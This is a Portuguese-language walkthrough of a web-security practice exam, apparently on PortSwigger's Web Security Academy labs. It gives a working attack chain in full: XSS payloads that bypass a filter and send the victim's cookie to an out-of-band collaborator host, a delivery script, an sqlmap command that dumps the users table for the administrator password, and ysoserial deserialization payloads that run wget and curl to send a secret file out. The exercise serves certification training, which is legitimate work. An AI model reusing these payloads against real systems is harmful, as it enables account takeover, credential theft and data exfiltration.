# Exame Prático 1

Tente fazer o exame sem olhar nenhum Walkthrough primeiro. Se você travar, aí sim procure por algumas dicas

Não se preocupe caso você não consiga fazer esses simulados de primeira, eu mesmo travei nos dois testes na primeira tentativa de cada.

<br>

## Etapa 1 - Acesso Inicial

O arquivo `searchResults.js` parece vulnerável à XSS.
```
function search(path) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText);
            displaySearchResults(searchResultsObj);
        }
};
```

Ao testar payloads comuns, eles funcionam:
```
"-alert()}//

"+eval(alert(1))}//

xss","test":alert(1)}//
```

Mas ao tentar extrair os cookies, somos bloqueados:
```
"-prompt(document.cookie)-"
```

Para bypassar isso, podemos usar esse payload:
```
"+eval("alert(window["document"]["cookie"])")}//
```

Para enviar para nós:
```
"+eval(atob("fetch(`https://qlfck5tq1bovu1ydd178jrxga7gy42sr.oastify.com/?jsonc=` + window["document"]["cookie"])"))}//
```

Mas é sempre bom encodar em Base64 e depois em URL para evitar problemas com encoding:
```
"+eval(atob("ZmV0Y2goYGh0dHBzOi8vcWxmY2s1dHExYm92dTF5ZGQxNzhqcnhnYTdneTQyc3Iub2FzdGlmeS5jb20vP2pzb25jPWAgKyB3aW5kb3dbImRvY3VtZW50Il1bImNvb2tpZSJdKQ=="))}//

%22%2b%65%76%61%6c%28%61%74%6f%62%28%22%5a%6d%56%30%59%32%67%6f%59%47%68%30%64%48%42%7a%4f%69%38%76%63%57%78%6d%59%32%73%31%64%48%45%78%59%6d%39%32%64%54%46%35%5a%47%51%78%4e%7a%68%71%63%6e%68%6e%59%54%64%6e%65%54%51%79%63%33%49%75%62%32%46%7a%64%47%6c%6d%65%53%35%6a%62%32%30%76%50%32%70%7a%62%32%35%6a%50%57%41%67%4b%79%42%33%61%57%35%6b%62%33%64%62%49%6d%52%76%59%33%56%74%5a%57%35%30%49%6c%31%62%49%6d%4e%76%62%32%74%70%5a%53%4a%64%4b%51%3d%3d%22%29%29%7d%2f%2f
```

Entregue o payload para a vítima atráves do servidor de exploração:
```
<script>
document.location = "https://0a1b007e035ef66d80af8a3700b000d7.web-security-academy.net/?SearchTerm=%22%2b%65%76%61%6c%28%61%74%6f%62%28%22%5a%6d%56%30%59%32%67%6f%59%47%68%30%64%48%42%7a%4f%69%38%76%63%57%78%6d%59%32%73%31%64%48%45%78%59%6d%39%32%64%54%46%35%5a%47%51%78%4e%7a%68%71%63%6e%68%6e%59%54%64%6e%65%54%51%79%63%33%49%75%62%32%46%7a%64%47%6c%6d%65%53%35%6a%62%32%30%76%50%32%70%7a%62%32%35%6a%50%57%41%67%4b%79%42%33%61%57%35%6b%62%33%64%62%49%6d%52%76%59%33%56%74%5a%57%35%30%49%6c%31%62%49%6d%4e%76%62%32%74%70%5a%53%4a%64%4b%51%3d%3d%22%29%29%7d%2f%2f"
</script>
```

<br>

## Etapa 2 - Escalação de Privilégios

Ao utilizar aspas no parâmetro `DATE`, um error é retornado.
```
https://0a1b007e035ef66d80af8a3700b000d7.web-security-academy.net/advanced_search?SearchTerm=aaa&organize_by=DATE'&blogArtist=aa
```

Podemos usar o SQLMap para extrair a senha do administrator:
```
sqlmap -r request.txt --level 5 --risk 3 -batch -p 'organize_by' -D public -T users --dump
```

> [!NOTE]  
> Se você copiar a request do Burp na mão para o arquivo TXT, lembre-se de mudar o header Host adicionando 'https://' como sufixo.

<br>

## Etapa 3 - Exfiltração de Dados

Note que o cookie tem um formato diferente.

Utilize a extensão Java Deserialization Scanner para identificar que o cookie está vulnerável e utiliza CommonsCollection, então gere o payload com:
```
java -jar ysoserial-all.jar CommonsCollections6 'wget --post-file /home/carlos/secret xghjfcoxwij2p8tk882feysn5eb5zwzko.oastify.com' | gzip -f | base64 -w0
```

Lembre de encodar em URL. Também é possível utilizar esse comando:
```
CommonsCollections6 'curl --data @/home/carlos/secret BURP.oastify.com'
```
